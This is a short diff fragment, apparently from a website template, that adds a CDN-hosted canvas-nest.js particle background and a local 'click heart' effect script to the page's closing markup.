+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+
+</body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/clicklove.js"></script>
